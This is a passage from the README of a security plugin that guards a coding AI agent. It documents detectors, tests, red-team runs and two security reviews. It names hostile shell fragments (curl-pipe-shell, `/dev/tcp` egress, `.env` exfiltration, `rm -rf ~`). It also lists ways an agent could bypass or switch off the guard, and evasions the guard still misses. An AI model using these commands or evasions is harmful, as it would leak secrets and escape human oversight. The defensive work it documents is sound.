python3 plugins/truviq-guard/bin/truviq.py doctor [--online] [--live]    # self-test; --live = a real harmless Claude Code session
python3 plugins/truviq-guard/bin/truviq.py uninstall [--purge] [--git REPO]
```

- **`install`** only does what the Claude Code CLI manages (`plugin marketplace add`, `plugin install`); it is safe to re-run (it updates instead of reinstalling). Default source is this folder; use `--source owner/repo` for the published marketplace.
- **`doctor`** checks Python, folder/file permissions, plugin files, Claude Code, whether the plugin is installed **and enabled**, runs three synthetic events through the real hook (blocks `rm -rf ~`, allows `ls`, blocks a fake key written into code), then mode, org policy, email, Supabase and enrollment. `--online` sends a heartbeat; `--live` proves all four hook events fire inside Claude Code. Each problem prints a one-line fix; exit code 1 if anything failed.
- **`uninstall`** removes the plugin and marketplace and leaves `~/.truviq` (keys, policy, logs) unless you add `--purge`, which refuses to delete anything that isn't a TruViq folder. The guard blocks the *agent* from running uninstall or disable commands; run them yourself in a terminal.
- **Central policy:** an admin writes `org-policy.json` and runs `truviq.py policy-publish org-policy.json` (needs the service-role key, admin machine only). Every machine pulls it at session start (hourly) or with `truviq.py policy-sync`, using the read-only anon key. Layers: **default, organisation, user, repository** (a repository can only tighten). If Supabase is unreachable the last good policy stays in force; an invalid policy is ignored.
- **Publish to GitHub:** `python3 release/export_marketplace.py /tmp/export` writes a clean copy (no `.env`, no caches) and **refuses and deletes the export if it finds a secret**. Push it, then others run `/plugin marketplace add owner/repo` and `/plugin install truviq-guard@truviq`.
- **Company-wide rollout:** [mdm/README.md](mdm/README.md) and [mdm/managed-settings.json](mdm/managed-settings.json) (force-enable the plugin through Claude Code's managed settings; verify the current file paths in Claude Code's docs before deploying).
- **Release check:** `python3 release/release_check.py [--reload] [--live] [--attacks]` runs the tests, checks the three version numbers agree, validates the marketplace and plugin, optionally updates the installed plugin to this version (`--reload`; then run `/reload-plugins`), and runs `doctor`. Non-zero exit = don't ship.
- **Run the SQL once:** `supabase/002_fleet_policy_redteam.sql` in the Supabase SQL editor (after `001_...`).

## R8 · Fleet health and compatibility

- **Heartbeat:** at most once an hour (at session start, in a background process) every machine sends machine, user, plugin and Claude Code version, mode, whether the hook files exist, a fingerprint of its effective settings, and the org policy version it applied. Table `guard_heartbeats` (anon insert-only).
- **Watchdog (admin machine):** `truviq.py watchdog [--stale-hours 36] [--no-email]` reads the latest heartbeat per machine and flags: **stale** (stopped reporting: guard off, uninstalled or offline), **mode** (monitor/off when the organisation requires enforce), **hooks** (files missing), **version** (older than the newest seen), **policy** (latest org policy not applied). New problems are emailed once per machine and kind per 24 h (detector `G-FLEET-001`). Run it hourly from cron.
- **Dashboard:** the **Fleet health** panel shows the same, per machine, with the problem text.
- **Compatibility:** `python3 release/compat_check.py [--attack]` runs one harmless real session per installed Claude Code version, captures the hook inputs and checks the fields the guard reads (`tool_use_id`, `tool_response`, `prompt`, ...); `--attack` also confirms `curl | sh` is blocked on each version. A change in a new Claude Code release shows up here before it breaks a user.
- **Not built (by decision):** adapters for other agents (R8.3, "when customers ask"). An independent review of the R6-R8 code was run; see section 10.

---

## 5. Configuration

Three layers, merged in this order:

| Layer | File | Who controls it | Power |
|---|---|---|---|
| Default | `plugins/truviq-guard/policy/default_policy.json` | TruViq | — |
| User | `~/.truviq/policy.json` | you (the agent cannot write it: protected path) | full |
| Project | `<repo>/.truviq/policy.json` | whoever wrote the repo | **tighten only** |

Most useful user settings:

```json
{
  "mode": "enforce",
  "trusted_paths": ["**/truviq_guard_for_coding_agents/**", "docs/attacks/**"],
  "egress_allow_hosts": ["github.com", "api.github.com", "pypi.org", "files.pythonhosted.org", "registry.npmjs.org", "api.mycompany.internal"],
  "detectors": { "G-PRIV-002": { "severity": "MEDIUM" } },
  "alerts": { "email_min_severity": "HIGH", "dedupe_minutes": 10 },
  "webfetch": "redirect"
}
```

| Key | Meaning |
|---|---|
| `mode` | `enforce` (default), `monitor` (log + chat note, never block), `off` |
| `severity_actions` | maps severity → `deny` / `ask` / `warn` / `log` |
| `detectors.<ID>.severity` / `.action` | per-detector override |
| `secret_paths`, `protected_paths`, `instruction_files`, `production_markers` | glob lists (`**` supported, `!` excludes, `~` = home) |
| `trusted_paths` | files the guard does not scan for injection (security docs, test payloads). User policy only. |
| `egress_allow_hosts` | hosts that do not count as "unknown" egress |
| `webfetch` | `redirect` (deny WebFetch, use `guard_fetch`) or `scan` (allow WebFetch, scan its output) |
| `llm` | `enabled`, `providers` order, `timeout_seconds`, `max_chars`, `groq_model`, `gemini_model` |
| `alerts` | `email_min_severity`, `dedupe_minutes` |
| `quality` | R9 code-quality checks: `enabled`, `run_tests`, `test_command`, `test_timeout_seconds`, `max_fix_rounds`, `linters`, `logic_review`, … (see [R9](#r9--code-quality-is-the-generated-code-right)) |

Your machine already has `~/.truviq/policy.json` trusting the guard's own source folder (its tests contain attack samples on purpose). This repository's `docs/` also contains attack examples; add `"docs/**"` to `trusted_paths` if the approval prompts get in your way there.

---

## 6. Email alerts (Resend)

1. Create a Resend account and an API key at <https://resend.com/api-keys>.
2. Put these in `~/.truviq/guard.env`:

   ```
   RESEND_API_KEY=re_xxxxxxxx
   TRUVIQ_ALERT_TO=you@yourcompany.com
   TRUVIQ_ALERT_FROM=TruViq Guard <onboarding@resend.dev>
   ```

   With the default sender `onboarding@resend.dev`, Resend only delivers to **the email address of your Resend account**. To email anyone else, verify a domain in Resend and change `TRUVIQ_ALERT_FROM` (e.g. `TruViq Guard <guard@alerts.yourcompany.com>`). `TRUVIQ_ALERT_TO` accepts a comma-separated list.
3. Test: `python3 plugins/truviq-guard/bin/truviq.py test-email`

How it behaves (only things that need attention right away are emailed; everything else goes to the dashboard):
- **Prompt injection and jailbreaks**, at MEDIUM or above: `G-INJ-001` (your prompt), `G-INJ-002` (a file), `G-INJ-003` (CLAUDE.md / AGENTS.md / rules), `G-INJ-005` (tool or web output), `G-OBF-001` (hidden text). Configured by `alerts.email_detectors`.
- **Any CRITICAL finding** (e.g. `.env` → curl, `curl | sh`, guard tampering, hallucinated package). Configured by `alerts.email_min_severity`.
- Every machine with the plugin emails the same inbox (`TRUVIQ_ALERT_TO`), and the email names the machine and user. Each machine needs `RESEND_API_KEY` in its own `~/.truviq/guard.env`.
- At most one email per detector per session every `dedupe_minutes` (default 10).
- Sent by a detached background process, so Claude Code never waits for email.
- Evidence is redacted; secret values are never emailed. Delivery results go to `~/.truviq/logs/alerts.log`.

---

## 7. Command-line tool

`python3 plugins/truviq-guard/bin/truviq.py <command>`

| Command | Purpose |
|---|---|
| `setup [--import-env PATH] [--with-service-key]` | Create `~/.truviq/guard.env` (600); copy known keys from a `.env` (service-role key only with the flag) |
| `status` | Mode, policy layers, LLM/email/Supabase configured, queued events (never prints secrets) |
| `report [--last N] [--session ID] [--evidence]` | Recent findings |
| `explain G-EXF-001` | What a detector means, what to do, compliance tags |
| `scan <path>…` | Scan files/folders for hidden text, AI-directed instructions, secrets |
| `scan-staged` | Git pre-commit check (used by the installed hook) |
| `install-git-hook [repo]` | Install the pre-commit secret scan (Release 0.3); refuses to overwrite a foreign hook |
| `test-email` | Send a test alert now |
| `dashboard [--port 8787] [--local]` | R3 dashboard at http://127.0.0.1:8787 (all machines via Supabase, or this machine) |
| `ship` | Send queued events to Supabase now (normally automatic) |
| `enroll --org NAME` | R7: register this machine, pull org policy, first heartbeat |
| `install [--source S] [--git REPO]` / `uninstall [--purge]` | R7: add/remove marketplace and plugin |
| `doctor [--online] [--live] [--json]` | R7: self-test with a fix for each problem |
| `policy-sync` / `policy-publish FILE` | R7: pull the org policy / publish one (admin) |
| `heartbeat [--pull-policy]` / `watchdog [--stale-hours N] [--no-email]` | R8: send a heartbeat / find unhealthy machines (admin) |

Inside Claude Code you can also just ask *"why was that blocked?"*; the `truviq-guard` skill runs `report`/`explain` for you. The MCP server adds `guard_fetch` (safe web fetch) and `guard_scan` (scan a file).

---

## 8. Testing

```bash
cd truviq_guard_for_coding_agents/tests && python3 -m unittest -v        # 219 tests, ~15 s, no network
python3 ../e2e/run_e2e.py --model haiku                                  # real Claude Code, 8 attack cases
```

| File | Covers | Tests |
|---|---|---|
| `test_shell.py` | 48 malicious + 68 normal commands, taint escalation, lethal trifecta | 7 |
| `test_detectors.py` | secrets, injection rules, paths, policy layering, classifier fail-closed | 18 |
| `test_engine.py` | Release 1–2 end to end through the engine and the real hook process | 31 |
| `test_fixtures.py` | replays of real hook inputs from Claude Code | 2 |
| `test_prompt_check.py` | jailbreak wording, pasted secrets, normal prompts silent, prompt classifier | 7 |
| `test_security_review.py` | one test per issue from the independent security review | 20 |
| `test_r3_r4.py` | R4 code/IaC/test-weakening rules, dependency diff and registry checks, DENY/ASK/APPROVE cards, prod deploy, ASK→Yes outcome, Supabase rows/shipping, email rules, dashboard server, false-positive fixes | 24 |
| `test_r6_r7_r8.py` | red-team maths; installer/uninstall/doctor against a fake `claude`; purge safety; git hook; enrollment; org policy layering and failure modes; heartbeat throttling; watchdog problems and email dedupe; marketplace export (secret refusal); compatibility checker; **17 regression tests from the second security review** | 60 |
| `test_quality.py` | **R9**: syntax deny (and fix-and-retry wording), edits that break a file, already-broken files, unused imports (Python, JS/TS), undefined names, JSON/TOML/JSONC, end-of-turn tests with send-back and the 2-round limit, new prompt resets rounds, hallucinated module, declared dependency, unused new dependency, tainted session, monitor mode, logic review on by default / switched off / no key, doctor status, real hook process, org/repo policy | 29 |
| `test_windows.py` | Hooks find Python without `python3` (Store placeholder skipped), no-Python error, install path with a space, every hook uses the launcher, `py -3 truviq.py uninstall` blocked for the agent, Windows doctor checks, `truviq` command and git hook use the launcher, clean export (no build output, no internal report), `setup --keys` (hidden input, mode 600, Enter keeps a key, refuses without a terminal) | 15 |

- **Manual testing:** [MANUAL_TEST_PLAN.md](MANUAL_TEST_PLAN.md) has 54 step-by-step tests for R3/R4 plus R1/R2 regression, with expected chat card, dashboard and email results and a results sheet.
- **Security regressions** (`test_security_review.py`, 20 tests): one per issue from the independent review in §10.
- **Unit/engine/hook tests** use an isolated `TRUVIQ_HOME`, LLM and email off. They include **48 malicious** and **68 normal** shell commands, injection positives/negatives, the full attack chain from the plan (§5.3), monitor/off modes, fail-safe, email dedupe, MCP server, git pre-commit, and **replays of real hook inputs captured from Claude Code 2.1.295**.
- **E2E** builds a harmless poisoned repo (`e2e/make_poisoned_repo.py`: fake canary secrets, `.invalid` URLs) and runs `claude -p --plugin-dir …` per case with your Claude Code login. Last run (haiku, after the security fixes): **7 PASS, 1 NOT_REACHED** (the model itself refused the `.env` exfiltration before calling a tool, so the guard was not needed; the same command is covered by the hook-level tests).

Full list with manual prompts: [TEST_CASES.md](TEST_CASES.md).

---

## 9. Publishing to friends and teams

The marketplace is published from a clean export, never from this working folder:

```bash
python3 release/export_marketplace.py ~/truviq-claude-plugins   # no .env, secrets, build caches or the internal report; refuses if it finds a key
cd ~/truviq-claude-plugins && git init -b main && git add -A && git commit -m "TruViq Guard 0.6.2"
git remote add origin git@github-truviq:Truviq-systems/truviq-claude-plugins.git && git push -u origin main
```

The marketplace is public at **github.com/Truviq-systems/truviq-claude-plugins**. Anyone installs it with:

1. In Claude Code:
   ```
   /plugin marketplace add Truviq-systems/truviq-claude-plugins
   /plugin install truviq-guard@truviq
   /reload-plugins
   ```
2. In a terminal: `truviq setup --keys` to add their own API keys (see [Step 1](#step-1--your-api-keys-once-per-machine)). Nobody shares keys.
3. `truviq doctor` (or `/truviq-doctor` in Claude Code) and fix anything it marks ✗.

If `/plugin marketplace add` fails over SSH, Claude Code falls back to HTTPS; a public repository needs no GitHub login.

**Updates:** bump `version` in `plugins/truviq-guard/.claude-plugin/plugin.json` and `.claude-plugin/marketplace.json`, export, commit, push; users run `/plugin marketplace update truviq` (or turn on auto-update for the `truviq` marketplace in `/plugin`).

**Windows (native, not WSL):**
- Install **Git for Windows** (git-scm.com). Claude Code runs the guard's hooks through Git Bash; without it they cannot run.
- Install **Python 3.8+** from python.org (tick "Add python.exe to PATH") or the Microsoft Store. The hooks find `python3`, `python` or `py -3` on their own and skip the Store placeholder, and a user name with a space (e.g. `C:\Users\Jane Doe`) is fine.
- The safe web-fetch tool (`guard_fetch`) is started by Claude Code directly and needs a working `python3` command. The Microsoft Store Python provides it. Without it, `doctor` warns and web fetches are refused; set `"webfetch": "scan"` in `~/.truviq/policy.json` to allow WebFetch with output scanning instead.

For a whole company, deploy Claude Code **managed settings** with `"enabledPlugins": {"truviq-guard@truviq": true}` and `extraKnownMarketplaces` pointing at the repo (see `mdm/`).

---

## 10. Security notes and limits

### Independent security review (2026-10-09)

An adversarial review of this plugin confirmed 10 issues. All are fixed and each has a regression test in `tests/test_security_review.py`:

| # | Issue | Fix |
|---|---|---|
| 1 | Secret env vars (`$ANTHROPIC_API_KEY`), `/dev/tcp`, and globs (`.en?`) bypassed exfil detection | Env-var secrets sent to unknown hosts → G-EXF-001; `/dev/tcp|udp` is egress; glob tokens are expanded |
| 2 | Huge inputs made the hook time out, and a timed-out hook lets the action run | Commands > 16 KB → ask; bounded regexes; linear comment scan; protected-path writes decided before any scan; internal 10 s budget fails **closed** |
| 3 | Swapping whole directories (`mv ~/.truviq …`, `cp -r x/. .git/hooks`) and `git config core.fsmonitor/sshCommand/alias.*` | Parents of protected paths are protected; code-running git config keys are tampering |
| 4 | `guard_fetch` was exempt from secret checks (an exfil channel) | Exemption removed; URLs checked for secrets and taint rules |
| 5 | Suspicious snippets (with secrets) could be sent to Groq/Gemini | Secret files never scanned; snippets redacted before classification and in `guard_scan` |
| 6 | Adding the word `truviq.py` to a command skipped output scanning | Only the real plugin CLI, without shell operators, is exempt |
| 7 | Truncated command prefixes leaked partial keys into logs/state/email | Redact before truncating; summaries and taint labels redacted |
| 8 | `\| /bin/sh`, `eval "$(curl …)"`, `source <(curl …)` evaded download-exec | Patterns extended |
| 9 | Pre-commit missed staged files with non-ASCII names | `git diff -z` |
| 10 | SSRF check allowed `100.64.0.0/10` and mapped IPv6 | Only globally routable addresses allowed |

Also added from the review: `Grep` on secret files marks the session, the guard home is protected wherever `TRUVIQ_HOME` points, and a repo whose `.claude/settings*.json` sets `TRUVIQ_` variables or disables the plugin triggers a warning at session start.

### Second independent review: R6-R8 code (2026-10-15)

An adversarial review of the new code confirmed 8 issues (3 HIGH). All are fixed, each with a regression test (`Review2Test`), and the reviewer's exact bypass commands were replayed through the real hook:

| # | Issue | Fix |
|---|---|---|
| 1 HIGH | The *agent* could run `truviq.py uninstall --purge`, `enroll`, `heartbeat`, `policy-sync` unblocked | Admin subcommands (`uninstall`, `install`, `enroll`, `setup`, `policy-*`, `heartbeat`, `watchdog`, `install-git-hook`) and `python -c/-m` imports of the guard's modules are CRITICAL tamper for the agent. Read-only use (`status`, `report`, `explain`, `doctor`, `scan`) stays allowed. |
| 2 HIGH | `cd ~/.truviq && rm last_heartbeat` and `python3 -c "open('…/org_policy.json','w')"` bypassed the protected-path check | Any non-read-only command that names the guard folder, or runs after a `cd` into it, is blocked; `cat`/`ls`/`grep` of logs still work |
| 3 HIGH | Heartbeats were forgeable: a client could set `created_at` far in the future and pin a machine as healthy; same-hostname machines masked each other; 5,000 junk rows pushed real machines out | SQL column grants (clients cannot set `id`/`created_at`), grouping by device id, a 14-day / 20,000-row window, negative ages clamped |
| 4 MED | Org policy had no integrity rules (could set `mode: off`, empty `secret_paths`, lower severities); plain-http Supabase URLs accepted; the watchdog's required mode came from the policy it was checking | The org policy is sanitised at publish, pull **and every load**: known keys only, path lists can only be *added to*, actions can only be raised, `mode` may be `enforce`/`monitor` but never `off`, `trusted_paths` never. `https` is required for Supabase. The watchdog's required mode is a CLI flag (`--require-mode`). |
| 5 LOW | `install --git` followed a repository's `core.hooksPath` or a symlinked hook | Refused; hooks are written only inside the real `.git/hooks`, never through a symlink (`O_NOFOLLOW`) |
| 6 LOW | `--purge` accepted any folder starting with `truviq` and could "succeed" through a symlink | Requires a folder named `.truviq` or one containing `.truviq-home` (written by `setup`); refuses symlinks; verifies deletion |
| 7 LOW | Predictable `/tmp/truviq-redteam-last.json` | `mkstemp` |
| 8 LOW | Export followed symlinks, missed `guard.env`/`credentials.json`/`*.tfvars`, and had a path-prefix bug | Skips symlinks and secret-looking names; exact path containment; the post-export secret scan remains the last line of defence |

### Known limits

- **No detector catches all prompt injection.** The real protection is the combination: block poisoned reads early, remember taint, and hard-block the dangerous *actions* (secret + network, download-and-run, tampering).
- **PostToolUse cannot un-read.** For tool output, the guard can only warn the model and mark the session; that is why files are scanned *before* `Read`. Content Claude gets via `Bash cat` is checked after the fact.
- **`CLAUDE.md` is loaded by Claude Code before any hook runs.** The SessionStart check warns you and tells the model to distrust it, but cannot prevent the load.
- **Shell analysis is pattern-based** (no full bash parser). Heavily obfuscated commands (`eval "$(echo … | rev)"`), interpreter one-liners that write files (`python3 -c "open('.claude/settings.json','w')…"`) and two-step exfiltration (`cp .env /tmp/x`, later `curl -T /tmp/x …`) can evade it.
- **Taint depends on detecting the injection.** A cleverly reworded injection that neither the rules nor the classifier flag leaves the session untainted.
- **Protected-path matching is case-sensitive**, which matters on macOS/Windows file systems.
- **The LLM classifier sends short snippets (≤ 4,000 chars) of suspicious text to Groq/Gemini.** Set `TRUVIQ_LLM=off` in `guard.env` to keep everything local (rules only).
- **Heartbeats are telemetry, not proof.** Anyone holding the (public-by-design) Supabase anon key can insert fake heartbeat rows for a device id; the column grants stop them choosing timestamps, but a determined attacker can still fake a healthy status. Per-device signing is not built. The watchdog finds *honest* failures (stopped, off, outdated), not a compromised machine reporting falsely.
- **Org policy relies on Supabase access control and TLS.** There is no cryptographic signature on the policy; the sanitiser makes a malicious policy unable to weaken the shipped defaults, but it could still add noise (extra protected paths, `monitor` mode, a different egress allow-list).
- **R4 code review is pattern-based SAST** on added lines only. It catches common mistakes at write time; CI scanning and human review still apply.
- **R9 is only as good as the project's tests.** Without tests the guard can catch code that cannot run (syntax, undefined names, missing modules) but not code that runs and gives the wrong answer; the AI logic review helps but is advisory and needs a Groq or Gemini key. Undefined-name checks use one flat scope per file, so they never report a name defined anywhere in the file (some real bugs are missed rather than raising false alarms). JS/TS syntax is checked only through the project's own eslint / tsc.
- **A "No" on an ASK is inferred.** Claude Code doesn't tell hooks about refusals, so the dashboard marks an ASK as *Not approved* after 15 minutes without the action running.
- **Dependency lookups need internet.** PyPI/npm/OSV checks time out after 2 s and are cached for 24 h; when they can't run, the card says "could not verify" (LOW), never "safe".
- **The installed plugin runs straight from this folder** (local marketplace). Every saved edit to the source is live in your guard immediately, so test changes with `python3 -m unittest` before saving related edits one at a time.
- **`guard_fetch` resolves the host to check it is public, then fetches.** A DNS-rebinding attacker could in theory switch the address between the two lookups.
- **Windows native:** needs Git for Windows (hooks run through Git Bash) and Python 3.8+ (`python3`, `python` or `py`); the safe web-fetch tool needs `python3` itself. Session state has no file locking there. The Windows paths are covered by simulated tests; Linux, WSL and macOS are the tested targets on real machines.
- **This guard does not replace** CI scanning, code review, or least-privilege credentials.

---

## What is done (Releases 0–4, 6–9)

### Release history

| Plugin version | Date | Release | What changed |
|---|---|---|---|
| 0.1.0 | 2026-10-09 | R0 + R1 | Hooks, command/secret/tamper detectors, rules file, monitor mode, fail-safe, pre-commit secret scan |
| 0.2.0 | 2026-10-09 | R2 + security review | Pre-read file scanning, tool-output scanning, session taint, Groq/Gemini classifier, `guard_fetch`, start-up instruction-file check, jailbreak check, explain skill; 10 review findings fixed |
| 0.2.1 | 2026-10-09 | R2 fix | Pasted secrets in prompts blocked (G-SEC-002); wider "ignore previous …" and "leak the secrets" rules; unclear prompts sent to the classifier |
| 0.6.2 | 2026-10-15 | Windows + publishing | Hooks run through `bin/run-python.sh`, which finds `python3`, `python` or `py -3` and skips the Microsoft Store placeholder (Windows has no `python3` by default); the `truviq` command and git pre-commit hook use it too. The agent is now also blocked from running guard admin commands through `py`. `doctor` checks Git Bash and `python3` on Windows. Export leaves out build caches and the internal report; `--help` works. New `truviq setup --keys` asks for each API key in the terminal (hidden) and saves it to `~/.truviq/guard.env`; README lists which key turns on which feature |
| 0.6.1 | 2026-10-15 | R9 update | The AI logic review is **on by default** (it was opt-in). `doctor` now shows whether it can run ("Code logic review: on (groq, gemini)", or what is missing). Turn it off with `"quality": {"logic_review": false}` |
| 0.6.0 | 2026-10-15 | **R9** Code quality | Before each write: syntax check (Python, JSON, TOML, YAML) that blocks unparsable files, unused imports (Python, JS/TS), undefined names (Python), the project's ruff / eslint on the added lines. At the end of the turn (new `Stop` hook): imports that resolve nowhere (hallucinated packages), the project's tests and TypeScript type check with Claude sent back to fix failures (max 2 rounds), unused new dependencies, optional LLM logic review (off by default). Detectors G-QUAL-001…007 |
| 0.5.0 | 2026-10-15 | Dashboard | The R3 dashboard is rebuilt as a Next.js app (static export shipped in the plugin; still only Python needed): triage strip (Asked a person / Blocked / Allowed with notes) with counts as filters, table in triage order, **NEW** marks for unseen actions, fleet health and red team above the table on narrow screens, Arial/Calibri, accessible verdict and severity marks (shape + word, never colour alone). The server now serves the built files with a stricter Content-Security-Policy and path-traversal protection |
| 0.4.1 | 2026-10-15 | Usability | Slash commands `/truviq-dashboard`, `/truviq-doctor`, `/truviq-report`; a `truviq` command on PATH (added by `install`, removed by `uninstall`, always runs the newest installed version); `doctor` checks it; the agent is blocked from `truviq uninstall/enroll/setup/…` exactly like `truviq.py …`; the launcher file is protected |
| 0.4.0 | 2026-10-15 | **R6 + R7 + R8** | Nightly guard-off vs guard-on red team (`redteam/`, Temporal wrapper); `install` / `doctor` / `uninstall` / `enroll`; central org policy (default, org, user, repo); clean GitHub export that refuses secrets; managed-settings template; `release_check`; hourly heartbeats, fleet watchdog with email, Fleet-health and Red-team dashboard panels; Claude Code compatibility checker; new tables in `supabase/002_fleet_policy_redteam.sql` |
| 0.3.0 | 2026-10-12 | **R3 + R4** | Central Supabase dashboard; generated-code review (G-CODE-002/003, G-IAC-001, G-VER-001); dependency review (G-DEP-001/003/004) and production deploys (G-DEP-002); DENY / ASK / APPROVE chat cards; ASK→Yes outcomes; email only for injection, jailbreak and CRITICAL; prompt-classifier false-positive fix; narrower `TRUVIQ_` tamper rule; `# nosec` only checked in code files; a crash inside a review step degrades to a "not reviewed" warning instead of blocking everything |

### Releases 0–2

| # | Feature | Where | Verified by |
|---|---|---|---|
| 0.1 | Secrets only in git-ignored `.env` / `~/.truviq/guard.env` (600) | `truviq.py setup` | `status`; `.gitignore` check |
| 0.2 | LLM judge fails closed | `classifier.py` | `ClassifierFailClosedTest` |
| 0.3 | Pre-commit secret scan | `truviq.py install-git-hook` (installed in this repo) | `GitPreCommitTest` |
| 1.1 | Guard + hooks on every tool call (~55 ms) | `hooks.json`, `guard_hook.py` | `HookProcessTest`, e2e |
| 1.2 | Dangerous command blocker | `shell.py` | 48-command malicious corpus, e2e `curl_pipe_sh` |
| 1.3 | Secret-theft blocker | `shell.py` | corpus, attack-chain test |
| 1.4 | Secrets-in-code blocker | `engine.py` + `secret_scan.py` | `WriteToolTest`, e2e `secret_in_code` |
| 1.5 | Self-protection | `protected_paths`, `TAMPER` rules | `WriteToolTest`, e2e `guard_tamper` |
| 1.6 | Rules file | `policy/default_policy.json` + user/project layers | `PolicyTest` |
| 1.7 | Monitor mode + local log | `mode: monitor`, `eventlog.py` | `test_monitor_mode_never_blocks` |
| 1.8 | Fail-safe | `guard_hook.py` | `test_fail_closed_for_bash_fail_open_for_read` |
| 2.1 | Hidden-text detector | `injection.py` | `InjectionScanTest`, e2e `hidden_unicode_doc` |
| 2.2 | Check files before reading | `engine._pre_tool` (Read) | `ReadAndTaintTest`, e2e `poisoned_readme` |
| 2.3 | Check tool output | `engine._post_tool` | attack-chain test, e2e `issue_output_injection` |
| 2.4 | Suspicious-session memory | `state.py` | attack-chain test |
| 2.5 | Injection classifier (Groq `gpt-oss-20b` → Gemini `2.5-flash`) | `classifier.py` | fallback/fail-closed tests; live check on real keys |
| 2.6 | Safe web fetch | `web.py`, `mcp_server.py`, WebFetch redirect | `McpServerTest`, e2e `webfetch_redirect` |
| 2.7 | Instruction-file check at start | `engine._session_start` | `test_session_start_flags_poisoned_claude_md` |
| 2.8 | Direct jailbreak check | `engine._prompt` | `test_jailbreak_prompt_warns_without_blocking` |
| 2.9 | Explain-a-block skill | `skills/truviq-guard/SKILL.md`, `truviq.py report/explain` | manual test M10 |
| + | Email alerts (Resend) | `alerts.py` | `test_email_alert_queued_once_per_window` (live send needs your Resend key) |

### Release 3: See everything

| # | Feature | Where | Verified by |
|---|---|---|---|
| 3.1 | Send events to the server (redacted, insert-only anon key, offline outbox + retry) | `sink.py`, `supabase/001_guard_events.sql` | `OutcomeAndShippingTest`, manual D8/D11 |
| 3.2 | Live dashboard (triage strip, triage-ordered table, filters, search, fleet / red-team / detector panels, local fallback) | `dashboard.py`, `dashboard-app/` → `dashboard/`, `truviq.py dashboard` | `DashboardTest`, manual Part D |
| 3.3 | Compliance tags on every finding and card | `catalog.py`, `cards.py` | card/row tests, manual D6–D7 |
| 3.4 | Alerts: email only for prompt injection, jailbreak and CRITICAL, from every machine | `alerts.py`, `policy.alerts.email_detectors` | `EmailRulesTest`, manual Part C |
| 3.5 | ASK outcome tracking (*Approved by the user* / *Not approved* / *Waiting*) | `engine.handle` (pending asks), dashboard | `test_ask_then_approve_creates_outcome_and_ships`, manual A1/A2 |

### Release 4: Write safer code

| # | Feature | Where | Verified by |
|---|---|---|---|
| 4.1 | Unsafe code patterns (Python, JS/TS, Go, Java), added lines only | `codecheck.py` | `CodeReviewTest`, manual A1–A7 |
| 4.2 | Fake / look-alike / new / vulnerable packages, git/URL sources, install scripts | `deps.py` | `DependencyReviewTest`, manual Part B |
| 4.3 | Unsafe infrastructure (Terraform, Kubernetes, Dockerfile, GitHub Actions) | `codecheck.IAC_RULES` | `test_iac_and_ci`, manual A8/A9 |
| 4.4 | Test weakening (skip, deleted assertions, lower coverage, `# nosec`) | `codecheck.py` | `test_weakened_tests`, manual A10/A11 |
| 4.5 | Production deploy check | `shell.DEPLOY_RX` | `test_prod_deploy`, manual B8/B9 |
| + | DENY / ASK / APPROVE card in the chat, plus native Yes/No for ASK | `cards.py`, `engine._reply` | card tests, manual Parts A/B |

### Release 9: Is the generated code right?

| # | Feature | Where | Verified by |
|---|---|---|---|
| 9.1 | Syntax check before the write (Python, JSON, TOML, YAML), blocks unparsable files | `quality.review_write`, `config_error` | `PreWriteTest` |
| 9.2 | Unused imports (Python, JS/TS) and undefined names (Python), new problems only | `quality.py_unused`, `py_undefined`, `js_unused` | `PreWriteTest` |
| 9.3 | Project linters (ruff, eslint) on added lines | `quality._lint_ruff`, `_lint_eslint` | runs only where the project has them |
| 9.4 | Imports that resolve nowhere (hallucinated packages), at the end of the turn | `quality.py_missing_imports`, `js_missing_imports` | `test_hallucinated_module_is_caught_at_the_end` |
| 9.5 | Project tests and TypeScript type check at the end of the turn; Claude sent back to fix (max 2 rounds) | `quality.stop_review`, `engine._stop`, `hooks.json` Stop | `EndOfTurnTest`; real Claude Code run (calculator) |
| 9.6 | Unused new dependencies | `quality._unused_new_deps` | `test_unused_new_dependency_is_a_note` |
| 9.7 | AI logic review of the diff against the request (advisory, on by default; `doctor` shows its status) | `quality._llm_json`, `logic_review_status` | `test_logic_review_is_on_by_default_and_advisory`, `test_logic_review_can_be_switched_off`; real Groq call (0.6 s, flagged division by zero) |

### Release 6: Attack ourselves

| # | Feature | Where | Verified by |
|---|---|---|---|
| 6.1 | Run real Claude Code against the demo repo, guard off vs on, canary-based scoring | `redteam/nightly.py`, `e2e/run_e2e.py` (`mode=`) | real run (see R6 section), `RedTeamTest` |
| 6.2 | Results stored and shown (local file, Supabase, dashboard panel) | `redteam_report.py`, `dashboard.py`, `002_*.sql` | `RedTeamTest`, dashboard smoke test |
| 6.3 | Nightly schedule (cron or Temporal, own task queue) | `redteam/temporal_nightly.py` | compile + no-SDK test; **not run against a Temporal server** |
| - | Promptfoo `coding-agent:*` plugins, own trap repos for MCP/rules files | - | **not built** |

### Release 7: Ready for customers

| # | Feature | Where | Verified by |
|---|---|---|---|
| 7.1 | `enroll`, `install`, `uninstall` | `install.py`, `fleet.py`, `truviq.py` | `InstallerTest` (fake `claude`) |
| 7.2 | `doctor` self-test (offline, `--online`, `--live`) | `install.py` | `DoctorTest`; real `doctor` run |
| 7.3 | Marketplace export for GitHub, refuses secrets | `release/export_marketplace.py` | `ReleaseToolsTest`; real export |
| 7.4 | Central policy (publish / pull / layering) | `fleet.py`, `config.py`, `002_*.sql` | `OrgPolicyTest` (Supabase calls mocked) |
| 7.5 | Managed-settings template and rollout guide | `mdm/` | template validity test; **not deployed on a managed machine** |
| + | `release_check` (tests, versions, validate, reload, doctor) | `release/release_check.py` | run for real |

### Release 8: Harden

| # | Feature | Where | Verified by |
|---|---|---|---|
| 8.1 | Heartbeats and "is it still on?" alerts | `fleet.py`, `engine.py` (SessionStart), `truviq.py watchdog` | `HeartbeatTest`, `WatchdogTest`, `WatchdogEmailTest` (Supabase and email mocked) |
| 8.2 | Claude Code version compatibility | `release/compat_check.py` | `ReleaseToolsTest`; real run on Claude Code 2.1.300 |
| 8.3 | Other agents (Cursor, Agent SDK, ...) | - | **not built** (waits for a customer) |
| 8.4 | External security review | - | an independent review of the R6-R8 code was run; see section 10 |

**Deliberate change from the plan:** Release 1 planned a background guard daemon. For a plugin that friends install, a per-event Python script is simpler and has no service to keep running; it runs in ~55 ms, close to the 50 ms target. A daemon can come later if a heavier local model is needed.

**Not touched:** nothing in the existing AI Sentinel backend (`src/`) or the AI_Guardian frontend was changed. The R3 dashboard is a separate app inside this folder (`dashboard-app/`). Files written outside this folder:
- `.git/hooks/pre-commit` (Release 0.3, with your approval);
- `app/db.py` in the repository root, created during manual test A1 and **intentionally vulnerable**. Delete it or fix it.

